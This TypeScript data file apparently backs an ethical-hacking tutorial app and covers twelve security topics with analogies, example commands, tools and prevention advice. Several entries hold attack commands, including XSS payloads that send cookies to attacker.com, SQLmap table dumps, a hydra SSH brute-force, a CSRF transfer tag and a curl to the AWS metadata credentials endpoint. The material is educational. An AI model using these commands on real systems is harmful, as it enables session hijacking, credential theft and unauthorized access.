/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { TopicDetail } from "../types";

export const TOPICS: Record<string, TopicDetail> = {
  linux_foundations: {
    id: "linux_foundations",
    title: "Linux Foundations & CLI Navigation",
    category: "System Basics",
    analogy: "Operating Linux via CLI is like piloting an airplane with precise coordinates rather than point-and-click buttons. It gives you raw, unfiltered control over every gear and lever.",
    explanation: "Linux is the backbone of hacking. Penetration testing OS platforms like Kali Linux and Parrot OS are built entirely on Linux. Command Line Interface (CLI) navigation is essential for managing directories, checking active processes, editing configurations, and executing automated exploits. Understanding the Filesystem Hierarchy Standard (e.g., `/etc` for configs, `/var` for logs, `/bin` for binaries) and permissions (Read, Write, Execute) is critical.",
    realWorldExample: "An ethical hacker gains local shell access on a target server and needs to find where database passwords are stored. By using recursive searches on `/etc` or listing cronjobs, they discover a plaintext password file.",
    commands: [
      { cmd: "ls -la", desc: "List all files and directories, including hidden files, with full permissions details." },
      { cmd: "cd /etc && cat passwd", desc: "Navigate to configuration folder and read users list." },
      { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Search the entire filesystem for SUID binaries (files that run with root privileges)." },
      { cmd: "grep -rnw '/var/www/' -e 'DB_PASSWORD'", desc: "Recursively search all files in the web root for DB credentials." }
    ],
    tools: ["Bash Shell", "Zsh", "Vim/Nano", "Systemctl"],
    prevention: "Configure strict file permissions (chmod 600 or 700 for sensitive configurations), disable root login via SSH, audit SUID binaries regularly, and implement security modules like SELinux or AppArmor."
  },
  networking_basics: {
    id: "networking_basics",
    title: "TCP/IP Networking & OSI Model Foundations",
    category: "Networking",
    analogy: "The OSI Model is like a global postal system. To send a letter (data), you write the message (Application), put it in an envelope (Presentation/Session), address it (Transport/Network), put it in a delivery truck (Data Link), and send it down the highway (Physical).",
    explanation: "You cannot hack what you cannot reach. Every network interaction relies on protocols. The TCP/IP suite handles the delivery of data across routers. TCP is a connection-oriented protocol that uses a 3-way handshake (SYN, SYN-ACK, ACK) to ensure data integrity, while UDP is connectionless and faster (used in video streaming/DNS). DNS (Port 53) translates domain names into IP addresses, and HTTP (Port 80) handles web requests.",
    realWorldExample: "A security analyst uses Wireshark during an assessment to monitor raw traffic. They capture unencrypted FTP or HTTP traffic containing a client's login session credentials.",
    commands: [
      { cmd: "ip a", desc: "Display active network interfaces and assigned IP addresses." },
      { cmd: "netstat -tulnp", desc: "List all active TCP and UDP ports currently listening on the local device." },
      { cmd: "dig target.com A +short", desc: "Perform DNS query to fetch the IPv4 address record of a host." },
      { cmd: "traceroute google.com", desc: "Trace the routing hops that packets take to reach the destination." }
    ],
    tools: ["Wireshark", "Tcpdump", "Netcat", "Dig"],
    prevention: "Enforce TLS (HTTPS) everywhere, turn off unused ports and services, configure strict firewall rules, and segregate networks with VLANs."
  },
  reconnaissance: {
    id: "reconnaissance",
    title: "Reconnaissance & OSINT (Open Source Intelligence)",
    category: "Information Gathering",
    analogy: "Reconnaissance is like a detective gathering blueprints, work hours, staff lists, and garbage logs of a bank before attempting to enter. 90% of hacking is research.",
    explanation: "Reconnaissance is the first step in any penetration testing engagement. Passive Reconnaissance avoids direct contact with the target, utilizing public assets like Whois databases, Google Dorking, Shodan (search engine for internet-connected devices), DNS records, and social media. Active Reconnaissance touches the target server (e.g., sending ping packets) and carries higher risk of detection.",
    realWorldExample: "Using specialized Google search strings (Dorks), a security researcher discovers an exposed backup `.sql` database script hosted on a client's public sub-domain.",
    commands: [
      { cmd: "whois target.com", desc: "Retrieve domain registration records, contacts, and DNS nameservers." },
      { cmd: "site:target.com filetype:pdf 'confidential'", desc: "Google Dork search to locate confidential documents hosted on the target site." },
      { cmd: "host -t ns target.com", desc: "Query the domain's authoritative Name Servers (NS) records." }
    ],
    tools: ["Shodan", "theHarvester", "Maltego", "Google Dorking", "Censys"],
    prevention: "Minimize public footprint, remove sensitive administrative details from Whois records, block search engine crawlers via `robots.txt` for admin paths (though do not list sensitive paths there either!), and monitor exposed public assets."
  },
  scanning_enumeration: {
    id: "scanning_enumeration",
    title: "Port Scanning & Service Enumeration",
    category: "Discovery",
    analogy: "Port scanning is like walking around a house in the dark, checking every window and door (ports) to see which ones are open, closed, or locked, and tapping on the glass to guess who lives inside (banner grabbing).",
    explanation: "Once subdomains and IPs are mapped, the hacker performs port scanning to find active services (SSH, HTTP, databases). Enumeration is the process of extracting detailed information about these services (such as product names, exact version numbers, and system configurations) to identify known CVEs (Common Vulnerabilities and Exposures) that can be exploited.",
    realWorldExample: "An Nmap scan reveals that port 21 (FTP) is open and is running vsftpd 2.3.4, which has a notorious backdoor exploit that allows immediate shell access.",
    commands: [
      { cmd: "nmap -sS -sV -T4 target.com", desc: "Perform a fast SYN Stealth Scan and detect exact service version numbers." },
      { cmd: "nmap -p 22,80,443 --script vuln target.com", desc: "Run vulnerability detection scripts against specific ports." },
      { cmd: "gobuster dir -u http://target.com -w common.txt", desc: "Brute force search to find hidden directories and directories on a web server." }
    ],
    tools: ["Nmap", "Gobuster", "Dirb", "Nikto", "Masscan"],
    prevention: "Configure host-based firewalls (iptables/UFW), disable banner grabbing by obscuring server header responses (e.g., hiding Apache/Nginx version info), and use Intrusion Prevention Systems (IPS) like Fail2ban."
  },
  owasp_sqlmap: {
    id: "owasp_sqlmap",
    title: "SQL Injection (SQLi) & Automated SQLmap",
    category: "Web Application Security",
    analogy: "Imagine ordering a drink at a drive-thru and saying: 'Give me a soda AND write down that I paid $0 and give me the master keys to the cash register'. If the system executes instructions blindly, it hands over the keys.",
    explanation: "SQL Injection occurs when user input is directly concatenated into a database query without proper sanitization. This allows attackers to manipulate the SQL commands executed by the database. SQLmap is an advanced open-source tool that automates the process of detecting and exploiting SQL injection flaws, letting testers dump full databases, read files, or execute remote system commands.",
    realWorldExample: "An attacker types `' OR 1=1 --` into a login password field. The backend checks `SELECT * FROM users WHERE user = 'admin' AND pass = '' OR 1=1 --'`, which evaluates to TRUE and logs them in as administrator.",
    commands: [
      { cmd: "sqlmap -u 'http://target.com/item.php?id=1' --dbs", desc: "Automatically test the parameterized URL parameter and list all database names." },
      { cmd: "sqlmap -u 'http://target.com/item.php?id=1' -D dev_db --tables", desc: "Extract and list all tables within the 'dev_db' database." },
      { cmd: "sqlmap -u 'http://target.com/item.php?id=1' -D dev_db -T users --dump", desc: "Dump all contents of the 'users' table, exposing passwords and personal data." }
    ],
    tools: ["SQLmap", "Burp Suite Suite", "Manual SQLi Payloads"],
    prevention: "Always use Prepared Statements and Parameterized Queries. Never concatenate string inputs into queries. Sanitize and validate all inputs, and use ORMs like Prisma or Sequelize."
  },
  owasp_xss: {
    id: "owasp_xss",
    title: "Cross-Site Scripting (XSS)",
    category: "Web Application Security",
    analogy: "XSS is like slipping a malicious sticky note containing hypnosis instructions into a public book. When another visitor reads the note, they execute the instructions (e.g., handing over their purse).",
    explanation: "Cross-Site Scripting happens when an application includes untrusted data in a web page without proper validation or escaping. There are three main types: Reflected (payload is in the immediate request URL), Stored (payload is saved to a database, e.g., in a comment section, and shown to all visitors), and DOM-based (exploit runs entirely in the client-side JavaScript DOM). Attackers use XSS to hijack sessions, steal cookies, or deface websites.",
    realWorldExample: "An attacker posts a comment on a forum containing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`. Every user who reads that thread gets their login session stolen.",
    commands: [
      { cmd: "alert(document.cookie)", desc: "A classic test payload injected into inputs to verify if javascript runs." },
      { cmd: "<img src=x onerror=alert(1)>", desc: "An alternative bypass payload that fires a javascript alert when the image fails to load." },
      { cmd: "document.location='http://attacker.com/log?c='+document.cookie", desc: "Payload to forward the victim's session tokens to an external server." }
    ],
    tools: ["XSStrike", "Burp Suite", "BeEF Framework", "DevTools"],
    prevention: "Implement context-aware HTML Entity Encoding (escape `<`, `>`, `&`, '\"', `'`), enforce strict Content Security Policies (CSP) to restrict scripts execution, and set cookie flags to `HttpOnly` so Javascript cannot read them."
  },
  owasp_csrf: {
    id: "owasp_csrf",
    title: "Cross-Site Request Forgery (CSRF)",
    category: "Web Application Security",
    analogy: "CSRF is like a scammer tricking you into signing a bank transfer check. You are already logged in and verified at the bank, so the bank executes the transfer because they see your legitimate signature.",
    explanation: "CSRF tricks a victim's web browser into executing an unwanted action on a trusted site where the victim is currently authenticated. Since the browser automatically attaches cookies (including session IDs) to requests, the target server thinks the victim made the request intentionally.",
    realWorldExample: "A user is logged into their bank account. They visit an online forum where an attacker has embedded an invisible image: `<img src='http://bank.com/transfer?to=attacker&amount=1000' width='0' height='0'>`. The browser loads the image, executing the transfer automatically.",
    commands: [
      { cmd: "<form action='http://target.com/profile/update' method='POST'>", desc: "Template HTML code used by attackers to forge POST requests in the background." }
    ],
    tools: ["Burp Suite CSRF Generator", "OWASP CSRF Guard"],
    prevention: "Incorporate unique anti-CSRF tokens in forms that the backend verifies, configure SameSite cookie flags (`SameSite=Strict` or `Lax`), and require re-authentication for sensitive actions (like password changes)."
  },
  owasp_idor: {
    id: "owasp_idor",
    title: "IDOR (Insecure Direct Object Reference)",
    category: "Web Application Security",
    analogy: "IDOR is like visiting a luggage storage room at a hotel. Your ticket says 'Bag #45'. You walk in and simply point to 'Bag #46' instead, and the attendant hands it to you without checking if it belongs to you.",
    explanation: "IDOR occurs when an application exposes a direct reference to an internal database key or file in the URL or payload (e.g., `?invoice_id=1024`), and fails to perform authorization checks. By simply changing the ID parameter, attackers can access records belonging to any other user.",
    realWorldExample: "A user logs into an billing portal and sees their invoice at `/get_invoice?id=8045`. They change the URL to `/get_invoice?id=8046` and successfully view a stranger's private business receipt and address.",
    commands: [
      { cmd: "curl -H 'Cookie: session=xyz' http://target.com/api/user/12", desc: "Check if altering the numeric ID in an API request fetches other users' data." }
    ],
    tools: ["Burp Suite Intruder", "Arjun", "Firefox Multi-Account Containers"],
    prevention: "Implement strict authorization checks at the data layer for every single request. Never assume a user has permission based on the URL. Use unpredictable, non-sequential identifiers like UUIDs."
  },
  auth_bypass: {
    id: "auth_bypass",
    title: "Authentication Bypass & JWT Tampering",
    category: "Web Application Security",
    analogy: "JWT tampering is like altering a VIP concert wristband. If the security guard (backend) forgets to inspect the digital security seal (signature) on the wristband, you can change your label from 'Guest' to 'Admin' and walk right in.",
    explanation: "Authentication bypass covers exploits that circumvent login mechanisms. JSON Web Tokens (JWTs) are popular stateless session tokens. If developers fail to verify the cryptographic signature of the JWT, an attacker can modify the claims payload (e.g., changing 'role': 'user' to 'role': 'admin') to escalate privileges.",
    realWorldExample: "An API uses JWTs signed with a weak secret. An attacker cracks the key using John the Ripper and signs a new token claiming to be the user 'admin'.",
    commands: [
      { cmd: "hydra -l admin -P rockyou.txt target.com ssh", desc: "Run a brute-force dictionary attack against a target's SSH service using the RockYou password list." },
      { cmd: "john --wordlist=rockyou.txt jwt.txt", desc: "Crack a JWT signature offline to discover the signing key." }
    ],
    tools: ["Hydra", "John the Ripper", "Hashcat", "JWT.io", "Burp JWT Editor"],
    prevention: "Use robust hashing algorithms (bcrypt/argon2), enforce multi-factor authentication (MFA), sign JWTs using strong asymmetric keys (RS256), and always verify the JWT signature before reading user roles."
  },
  reverse_engineering: {
    id: "reverse_engineering",
    title: "Reverse Engineering & Buffer Overflows",
    category: "Binary Exploitation",
    analogy: "Buffer overflow is like pouring water into a glass. If you pour too much, it spills over the table, ruining important paperwork nearby. In computing, spilling data over memory boundaries allows you to overwrite the program's next instructions.",
    explanation: "Reverse Engineering is the process of dissecting a compiled binary (EXE, ELF, APK) to understand its logic and find bugs. Buffer Overflow is a classic vulnerability where a program writes more data to a buffer than it was allocated for, overwriting adjacent memory spaces like the stack's Return Address (EIP/RIP). Attackers leverage this to redirect execution flow and run custom malicious code (shellcode).",
    realWorldExample: "A legacy network service uses the insecure `strcpy()` function. An attacker sends an excessively long string, overwrites the return pointer in memory, and triggers execution of a reverse shell script.",
    commands: [
      { cmd: "gdb ./vulnerable_binary", desc: "Launch GNU Debugger to analyze binary execution and inspect memory registers." },
      { cmd: "objdump -d ./binary | grep -A 20 main", desc: "Disassemble the binary to view the assembly instructions of the main function." },
      { cmd: "pattern create 100", desc: "Create a unique pattern string in metasploit to pinpoint the exact offset of memory overwrite." }
    ],
    tools: ["Ghidra", "Radare2", "IDA Pro", "GDB", "Immunity Debugger"],
    prevention: "Use safe string libraries (e.g., `strncpy` instead of `strcpy`), compile binaries with modern security flags like ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), and Stack Canaries."
  },
  cloud_security: {
    id: "cloud_security",
    title: "Cloud Security & AWS/Azure Misconfigurations",
    category: "Cloud Security",
    analogy: "Having a misconfigured cloud bucket is like storing your company's physical files in a glass filing cabinet on a public sidewalk. Anyone walking by can see and open it.",
    explanation: "Modern applications host their storage and compute engines in public clouds. The primary source of cloud breaches is not advanced malware, but misconfigured permissions (IAM rules, public S3 buckets, exposed API keys). Additionally, SSRF vulnerabilities allow attackers to query internal Cloud Metadata services (e.g., `http://169.254.169.254`) and retrieve temporary security credentials.",
    realWorldExample: "An attacker finds an exposed AWS S3 bucket named `dev-backups` that permits public reading, allowing them to download complete corporate databases containing millions of user records.",
    commands: [
      { cmd: "aws s3 ls s3://target-leaked-bucket --no-sign-request", desc: "List S3 bucket contents without using AWS account credentials to check for public access." },
      { cmd: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "Access the AWS metadata endpoint from an exploited server to extract administrative credentials." }
    ],
    tools: ["AWS CLI", "Pacu", "Prowler", "Cloudsploit"],
    prevention: "Enforce least-privilege IAM policies, block public S3 access explicitly at the organization level, enable AWS GuardDuty, and upgrade to IMDSv2 which protects the metadata endpoint from SSRF attacks."
  },
  mobile_hacking: {
    id: "mobile_hacking",
    title: "Mobile App Security (Android & iOS Hacking)",
    category: "Mobile Security",
    analogy: "Dynamic analysis with Frida is like pausing a movie, changing the lines the actor is about to say, and pressing play again. You can rewrite the app's functions in real-time.",
    explanation: "Mobile apps interact with backend APIs and handle local cache data. Mobile penetration testing involves decompiling applications to extract embedded API keys, checking local SQLite storage for sensitive data, intercepting HTTPS traffic via proxy certs, and executing dynamic analysis. Using tools like Frida, pen testers inject JavaScript scripts to bypass biometric logins (Fingerprint bypass) and jailbreak/root detection checks.",
    realWorldExample: "A banking app blocks rooted phones. A security engineer uses Frida to hook the `isRooted()` function and force it to always return `false`, bypassing the check entirely.",
    commands: [
      { cmd: "apktool d target_app.apk", desc: "Decompile an Android APK into readable Smali source code and AndroidManifest.xml." },
      { cmd: "frida-ps -Uai", desc: "List all running applications on a USB-connected mobile device." },
      { cmd: "frida -U -f com.target.app -l bypass_jailbreak.js", desc: "Launch target app and inject a script to bypass root/jailbreak checks." }
    ],
    tools: ["Apktool", "JADX-GUI", "Frida", "Objection", "MobSF"],
    prevention: "Use secure storage APIs (Android Keystore, iOS Keychain), obfuscate code with ProGuard, avoid storing API keys inside client binaries, and implement robust server-side authentication checks."
  }
};
